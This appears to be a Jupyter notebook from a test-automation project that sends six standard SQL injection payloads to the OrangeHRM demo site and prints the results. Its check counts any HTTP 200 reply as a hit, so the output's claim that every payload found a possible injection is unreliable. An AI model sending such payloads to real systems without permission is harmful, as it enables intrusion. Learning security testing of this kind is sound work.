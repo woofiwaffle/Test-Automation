{
 "cells": [
  {
   "cell_type": "code",
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-09-11T19:07:45.627937Z",
     "start_time": "2024-09-11T19:07:39.780922Z"
    }
   },
   "source": [
    "import requests\n",
    "\n",
    "def test_sql_injection(url):\n",
    "    payloads = [\n",
    "        \"' OR '1'='1\",\n",
    "        '\" OR \"1\"=\"1',\n",
    "        \"' OR 1=1--\",\n",
    "        '\" OR 1=1--',\n",
    "        \"' OR 'a'='a\",\n",
    "        '\" OR \"a\"=\"a',\n",
    "    ]\n",
    "\n",
    "    for payload in payloads:\n",
    "        test_url = f\"{url}?id={payload}\"\n",
    "        response = requests.get(test_url)\n",
    "        if \"sql\" in response.text.lower() or response.status_code == 200:\n",
    "            print(f\"Possible SQL Injection found with payload: {payload}\")\n",
    "        else:\n",
    "            print(f\"No SQL Injection with payload: {payload}\")\n",
    "\n",
    "# Запуск теста в Jupyter\n",
    "if __name__ == \"__main__\":\n",
    "    test_url = \"https://opensource-demo.orangehrmlive.com/web/index.php\"\n",
    "    test_sql_injection(test_url)\n"
   ],
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Possible SQL Injection found with payload: ' OR '1'='1\n",
      "Possible SQL Injection found with payload: \" OR \"1\"=\"1\n",
      "Possible SQL Injection found with payload: ' OR 1=1--\n",
      "Possible SQL Injection found with payload: \" OR 1=1--\n",
      "Possible SQL Injection found with payload: ' OR 'a'='a\n",
      "Possible SQL Injection found with payload: \" OR \"a\"=\"a\n"
     ]
    }
   ],
   "execution_count": 3
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
